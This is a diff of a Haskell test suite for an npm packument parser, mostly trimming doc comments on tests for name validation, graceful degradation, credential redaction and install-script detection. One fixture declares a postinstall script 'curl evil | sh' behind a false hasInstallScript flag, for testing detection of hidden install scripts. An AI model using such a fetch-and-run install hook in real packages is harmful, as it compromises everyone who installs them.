@@ -71,7 +71,6 @@ spec = do
     dropRedactionSpec
     totalitySpec
 
--- | Require each npm entry point to accept the shared name-grammar fixtures.
 nameGrammarSpec :: Spec
 nameGrammarSpec = describe "projectName -- the one npm name grammar" $ do
     for_ NpmFixture.npmNameVerdicts $ \(raw, valid) ->
@@ -99,7 +98,6 @@ leadCharacterSpec = describe "npmNameLeadChars" $ do
     it "admits exactly the characters a one-character name parses under" $
         filter (isLeft . projectName . T.singleton) npmNameLeadChars `shouldBe` []
 
--- | Reject non-ASCII codepoints and ASCII controls independently of Unicode character classes.
 asciiBoundarySpec :: Spec
 asciiBoundarySpec = describe "projectName -- the ASCII boundary" $ do
     it "refuses a Hangul filler, an invisible that is no format character" $ do
@@ -141,7 +139,6 @@ asciiBoundarySpec = describe "projectName -- the ASCII boundary" $ do
     realName = "left-pad"
     invisibleTwin = "left-\x3164\&pad"
 
--- | Reject npm error-tier names while preserving legacy warning-tier names.
 npmValidatorRefusalSpec :: Spec
 npmValidatorRefusalSpec = describe "projectName -- npm's own validator tiers" $ do
     it "refuses a character encodeURIComponent would escape" $
@@ -342,7 +339,7 @@ versionListSpec = describe "parseVersionList" $ do
         vs <- expectRight (parseVersionList (RegistryResponse 200 (BS.length multiVersionPackument) multiVersionPackument))
         map renderVersion vs `shouldBe` ["1.0.0", "1.2.0", "2.0.0"]
 
--- | One version broken in a required or security-decisive field is dropped from the decision surface, never denying the whole package.
+-- A malformed required or security-decisive field must drop only its version.
 versionLevelLeniencySpec :: Spec
 versionLevelLeniencySpec = describe "version-level graceful degradation (one broken version never denies the package)" $ do
     it "drops every version broken in a distinct required field, keeping the healthy one" $ do
@@ -396,7 +393,7 @@ versionLevelLeniencySpec = describe "version-level graceful degradation (one bro
                 Map.member "3.0.0" (infoVersions info) `shouldBe` True
             other -> fail ("expected a Projected packument, got: " <> show other)
 
--- | Malformed manifests, tags, and timestamps must not remove a healthy version.
+-- Malformed manifests, tags, and timestamps must not remove a healthy version.
 gracefulDegradationSpec :: Spec
 gracefulDegradationSpec = describe "graceful per-entry degradation with typed drop-tracking" $ do
     it "serves the sound version while dropping malformed dist-tags/time/version siblings" $ do
@@ -431,7 +428,7 @@ gracefulDegradationSpec = describe "graceful per-entry degradation with typed dr
         info <- projectInfoOf malformedBookkeepingTimePackument
         filter ((== InvalidPublishTime) . invalidKind) (infoInvalidEntries info) `shouldBe` []
 
--- | Dropped manifests reach logs, so URL credentials must be removed from their recorded values.
+-- Dropped manifests reach logs, so their recorded values must omit URL credentials.
 dropRedactionSpec :: Spec
 dropRedactionSpec = describe "drop-tracking redaction (a credentialed tarball URL)" $ do
     it "records the dropped manifest's tarball authority, never its URL" $ do
@@ -446,7 +443,7 @@ dropRedactionSpec = describe "drop-tracking redaction (a credentialed tarball UR
         info <- projectInfoOf credentialedDropPackument
         Map.keys (infoVersions info) `shouldBe` ["1.0.0"]
 
--- | Untrusted bytes and decoded values must produce results without synchronous exceptions.
+-- Untrusted bytes and decoded values must not cause synchronous exceptions.
 totalitySpec :: Spec
 totalitySpec = describe "projection totality (arbitrary input never bottoms)" $ do
     it "the live packument projection is total over an arbitrary decoded Value (every version projected through it)" $
@@ -471,7 +468,6 @@ totalitySpec = describe "projection totality (arbitrary input never bottoms)" $ 
             H.cover 5 "projects (Right)" (isRight decoded)
             H.cover 5 "rejects (Left)" (isLeft decoded)
 
--- | Assert a projection entry is total over an arbitrary 'Value' body.
 projectionIsTotal :: (RegistryResponse -> String) -> PropertyT IO ()
 projectionIsTotal render = do
     v <- forAll genBody
@@ -479,14 +475,13 @@ projectionIsTotal render = do
     _ <- H.eval (length (render (RegistryResponse 200 (BS.length (encodeToBody v)) (encodeToBody v))))
     H.success
 
--- | Malformed bytes must yield a parse failure rather than a crash.
+-- Malformed bytes must yield a parse failure rather than a crash.
 projectionBytesIsTotal :: (RegistryResponse -> String) -> PropertyT IO ()
 projectionBytesIsTotal render = do
     bytes <- forAll (Gen.bytes (Range.linear 0 64))
     _ <- H.eval (length (render (RegistryResponse 200 (BS.length bytes) bytes)))
     H.success
 
--- | Exercise decoded inputs directly, without a serialisation round trip.
 projectionValueIsTotal :: (Value -> String) -> PropertyT IO ()
 projectionValueIsTotal render = do
     v <- forAll genBody
@@ -494,17 +489,15 @@ projectionValueIsTotal render = do
     _ <- H.eval (length (render v))
     H.success
 
--- | Force a projection result fully by rendering both arms to a 'String'.
 showResult :: (Show a) => Either ParseError a -> String
 showResult = \case
     Left e -> show e :: String
     Right a -> show a :: String
 
--- | Encode a generated 'Value' into a strict response body.
 encodeToBody :: Value -> ByteString
 encodeToBody = BL.toStrict . encode
 
--- | Bias keys toward recognised fields so generated objects reach the successful projection paths.
+-- Recognised keys let generated objects reach successful projection paths.
 packumentKeys :: [Text]
 packumentKeys =
     [ "name"
@@ -527,11 +520,10 @@ packumentKeys =
     , "latest"
     ]
 
--- | A body generator mixing fully-arbitrary JSON with packument-shaped objects, so a property reaches both the rejecting and the projecting arm.
+-- Both rejecting and projecting inputs are needed to avoid a vacuous totality check.
 genBody :: H.Gen Value
 genBody = Gen.frequency [(1, genValue packumentKeys), (1, genPackumentish)]
 
--- | Bias object shape toward a packument while keeping field values arbitrary.
 genPackumentish :: H.Gen Value
 genPackumentish = do
     name <- Gen.text (Range.linear 1 8) Gen.alphaNum
@@ -543,7 +535,6 @@ genPackumentish = do
         ]
             <> extra
 
--- | Generate version-shaped objects that can reach artifact projection.
 genVersionish :: H.Gen Value
 genVersionish = do
     tarball <- genJsonText
@@ -555,69 +546,62 @@ genVersionish = do
         ]
             <> extra
 
--- | Derive install-script presence from postinstall when its summary flag is absent.
 fullPostinstallPackument :: ByteString
 fullPostinstallPackument =
     "{\"name\":\"derived\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\"1.0.0\":\
     \{\"name\":\"derived\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"node x.js\"},\
     \\"dist\":{\"tarball\":\"https://r/derived/-/derived-1.0.0.tgz\"}}}}"
 
--- | A full-form packument whose single version sets @hasInstallScript:false@ explicitly, so install presence is a determination rather than a derivation.
 noInstallScriptPackument :: ByteString
 noInstallScriptPackument =
     "{\"name\":\"noscript\",\"versions\":{\"1.0.0\":{\"name\":\"noscript\",\"version\":\"1.0.0\",\
     \\"hasInstallScript\":false,\"dist\":{\"tarball\":\"https://r/noscript/-/noscript-1.0.0.tgz\"}}}}"
 
--- | A packument whose version sets @hasInstallScript:false@ but declares a real @postinstall@ script.
 falseFlagWithPostinstallPackument :: ByteString
 falseFlagWithPostinstallPackument =
     "{\"name\":\"liar\",\"versions\":{\"1.0.0\":{\"name\":\"liar\",\"version\":\"1.0.0\",\
     \\"hasInstallScript\":false,\"scripts\":{\"postinstall\":\"curl evil | sh\"},\
     \\"dist\":{\"tarball\":\"https://r/liar/-/liar-1.0.0.tgz\"}}}}"
 
--- | A packument whose version's @dist@ reports an @unpackedSize@.
 sizedPackument :: ByteString
 sizedPackument =
     "{\"name\":\"sized\",\"versions\":{\"1.0.0\":{\"name\":\"sized\",\"version\":\"1.0.0\",\
     \\"dist\":{\"tarball\":\"https://r/sized/-/sized-1.0.0.tgz\",\"unpackedSize\":6510}}}}"
 
--- | A packument whose tarball URL ends in a slash (no filename segment).
 trailingSlashPackument :: ByteString
 trailingSlashPackument =
     "{\"name\":\"slash\",\"versions\":{\"1.0.0\":{\"name\":\"slash\",\"version\":\"1.0.0\",\
     \\"dist\":{\"tarball\":\"https://r/slash/\"}}}}"
 
--- | A packument whose version's @dist@ carries only the SRI @integrity@.
 integrityOnlyPackument :: ByteString
 integrityOnlyPackument =
     "{\"name\":\"intg\",\"versions\":{\"1.0.0\":{\"name\":\"intg\",\"version\":\"1.0.0\",\
     \\"dist\":{\"tarball\":\"https://r/intg/-/intg-1.0.0.tgz\",\"integrity\":\"sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==\"}}}}"
 
--- | A packument whose version's @dist@ carries only the legacy SHA-1 @shasum@.
 shasumOnlyPackument :: ByteString
 shasumOnlyPackument =
     "{\"name\":\"sha\",\"versions\":{\"1.0.0\":{\"name\":\"sha\",\"version\":\"1.0.0\",\
     \\"dist\":{\"tarball\":\"https://r/sha/-/sha-1.0.0.tgz\",\"shasum\":\"da39a3ee5e6b4b0d3255bfef95601890afd80709\"}}}}"
 
--- | An empty shasum must contribute no digest.
+-- An empty shasum must contribute no digest.
 emptyShasumPackument :: ByteString
 emptyShasumPackument =
     "{\"name\":\"es\",\"versions\":{\"1.0.0\":{\"name\":\"es\",\"version\":\"1.0.0\",\
     \\"dist\":{\"tarball\":\"https://r/es/-/es-1.0.0.tgz\",\"shasum\":\"\"}}}}"
 
--- | An empty integrity string must contribute no digest.
+-- An empty integrity string must contribute no digest.
 emptyIntegrityPackument :: ByteString
 emptyIntegrityPackument =
     "{\"name\":\"ei\",\"versions\":{\"1.0.0\":{\"name\":\"ei\",\"version\":\"1.0.0\",\
     \\"dist\":{\"tarball\":\"https://r/ei/-/ei-1.0.0.tgz\",\"integrity\":\"\"}}}}"
 
--- | Empty digest fields must leave the artifact hashless.
+-- Empty digest fields must leave the artifact hashless.
 emptyBothPackument :: ByteString
 emptyBothPackument =
     "{\"name\":\"eb\",\"versions\":{\"1.0.0\":{\"name\":\"eb\",\"version\":\"1.0.0\",\
     \\"dist\":{\"tarball\":\"https://r/eb/-/eb-1.0.0.tgz\",\"shasum\":\"\",\"integrity\":\"\"}}}}"
 
--- | One valid version must survive three independently malformed siblings.
+-- One valid version must survive independently malformed siblings.
 mixedHealthAndBrokenPackument :: ByteString
 mixedHealthAndBrokenPackument =
     "{\"name\":\"mix\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\
@@ -626,7 +610,6 @@ mixedHealthAndBrokenPackument =
     \\"3.0.0\":{\"name\":\"mix\",\"version\":\"3.0.0\",\"dist\":{\"shasum\":\"abc\"}},\
     \\"4.0.0\":42}}"
 
--- | A sound 1.0.0 beside an @_npmUser@ and a @license@ that are neither a string nor an object.
 unshapedPublisherAndLicencePackument :: ByteString
 unshapedPublisherAndLicencePackument =
     "{\"name\":\"mix\",\"versions\":{\
@@ -634,7 +617,6 @@ unshapedPublisherAndLicencePackument =
     \\"2.0.0\":{\"name\":\"mix\",\"version\":\"2.0.0\",\"_npmUser\":5,\"dist\":{\"tarball\":\"https://r/mix/-/mix-2.0.0.tgz\"}},\
     \\"3.0.0\":{\"name\":\"mix\",\"version\":\"3.0.0\",\"license\":[\"MIT\"],\"dist\":{\"tarball\":\"https://r/mix/-/mix-3.0.0.tgz\"}}}}"
 
--- | A packument whose 1.0.0 is sound beside a malformed sibling in every per-entry-lenient axis.
 gracefulDegradationPackument :: ByteString
 gracefulDegradationPackument =
     "{\"name\":\"mix\",\"dist-tags\":{\"latest\":\"1.0.0\",\"broken\":5},\"versions\":{\
@@ -642,21 +624,21 @@ gracefulDegradationPackument =
     \\"2.0.0\":{\"name\":\"mix\",\"version\":\"2.0.0\",\"dist\":5}},\
     \\"time\":{\"created\":\"2018-01-01T00:00:00.000Z\",\"1.0.0\":\"not-a-date\"}}"
 
--- | A dropped version carries URL credentials that its diagnostic record must redact.
+-- Diagnostic records must redact URL credentials from a dropped version.
 credentialedDropPackument :: ByteString
 credentialedDropPackument =
     "{\"name\":\"mix\",\"versions\":{\
     \\"1.0.0\":{\"name\":\"mix\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/mix/-/mix-1.0.0.tgz\"}},\
     \\"2.0.0\":{\"version\":\"2.0.0\",\"dist\":{\"tarball\":\"https://deploy:hunter2@r/mix/-/mix-2.0.0.tgz?sig=abc\"}}}}"
 
--- | An invalid bookkeeping timestamp must not become an invalid publish-time event.
+-- A bookkeeping timestamp is not a version publication event.
 malformedBookkeepingTimePackument :: ByteString
 malformedBookkeepingTimePackument =
     "{\"name\":\"bk\",\"versions\":{\
     \\"1.0.0\":{\"name\":\"bk\",\"version\":\"1.0.0\",\"dist\":{\"tarball\":\"https://r/bk/-/bk-1.0.0.tgz\"}}},\
     \\"time\":{\"created\":\"not-a-date\",\"1.0.0\":\"2018-01-01T00:00:00.000Z\"}}"
 
--- | Malformed advisory fields must not discard versions or their integrity hashes.
+-- Malformed advisory fields must not discard versions or their integrity hashes.
 advisoryJunkPackument :: ByteString
 advisoryJunkPackument =
     "{\"name\":\"adv\",\"dist-tags\":{\"latest\":\"1.0.0\"},\"versions\":{\
@@ -676,7 +658,6 @@ flaggedPackument member =
   where
     release = (NpmFixture.versionSpec "flagged" "1.0.0" "https://registry.npmjs.org/flagged/-/flagged-1.0.0.tgz"){NpmFixture.vsExtraPairs = member}
 
--- | A packument with three versions, to check version-list extraction.
 multiVersionPackument :: ByteString
 multiVersionPackument =
     "{\"name\":\"multi\",\"versions\":{\
@@ -684,29 +665,25 @@ multiVersionPackument =
     \\"1.2.0\":{\"name\":\"multi\",\"version\":\"1.2.0\",\"dist\":{\"tarball\":\"https://r/b.tgz\"}},\
     \\"2.0.0\":{\"name\":\"multi\",\"version\":\"2.0.0\",\"dist\":{\"tarball\":\"https://r/c.tgz\"}}}}"
 
--- | The canonical key of a 'PackageName' (verbatim for npm).
 renderName :: PackageName -> Text
 renderName = TS.toText . pkgCanonical
 
--- | npm projection yields exactly one artifact per version.
+-- npm projection yields exactly one artifact per version.
 soleArtifact :: PackageDetails -> Artifact
 soleArtifact d = let (art :| _) = pkgArtifacts d in art
 
--- | Whether a 'CodeExecSignal' is one of the @RunsCodeOnInstall@ determinations.
 runsCode :: CodeExecSignal -> Bool
 runsCode = \case
     RunsCodeOnInstall _ -> True
     _ -> False
 
--- | Read a committed fixture body by name (under @core\/test\/unit\/fixtures\/npm\/@, the path Cabal runs tests from).
+-- Cabal runs these tests from the package root.
 readFixture :: FilePath -> IO ByteString
 readFixture name = readFileBS ("core/test/unit/fixtures/npm/" <> name)
 
--- | A minimal packument 'Value' self-reporting the given top-level @name@.
 packumentValueNamed :: Text -> Value
 packumentValueNamed nm = object ["name" .= nm, "versions" .= object []]
 
--- | The refusal text 'projectName' gives a name, or 'Nothing' when the name parses.
 refusalOf :: Text -> Maybe Text
 refusalOf raw = case projectName raw of
     Left (ParseError message) -> Just message
@@ -715,7 +692,6 @@ refusalOf raw = case projectName raw of
 projectInfoOf :: ByteString -> IO PackageInfo
 projectInfoOf body = decodeJsonOrFail body >>= projectedInfo
 
--- | Project an already-decoded packument 'Value' into its 'PackageInfo' through the live 'parsePackageInfoFromValue', validating against the value's own self-reported name.
 projectedInfo :: Value -> IO PackageInfo
 projectedInfo value =
     case parsePackageInfoFromValue (NpmFixture.documentName value) value of
@@ -723,22 +699,18 @@ projectedInfo value =
         Right (NameMismatch reported) -> fail ("unexpected name mismatch: " <> toString reported)
         Left e -> fail ("unexpected ParseError: " <> show e)
 
--- | A missing or rejected version yields 'Nothing'.
 lookupVersionOf :: ByteString -> Version -> IO (Maybe PackageDetails)
 lookupVersionOf body version = do
     info <- projectInfoOf body
     pure (Map.lookup (renderVersion version) (infoVersions info))
 
--- | Fail the example if its requested version cannot be projected.
 projectVersionOf :: ByteString -> Version -> IO PackageDetails
 projectVersionOf body version =
     lookupVersionOf body version
         >>= maybe (fail ("version not present in packument: " <> toString (renderVersion version))) pure
 
--- | Project one version of a fixture file into its 'PackageDetails' through the live projection.
 projectVersion :: FilePath -> Version -> IO PackageDetails
 projectVersion name version = readFixture name >>= (`projectVersionOf` version)
 
--- | Fail the test when an expected ISO-8601 timestamp cannot be parsed.
 readUTC :: (MonadFail m) => Text -> m UTCTime
 readUTC = iso8601ParseM . toString
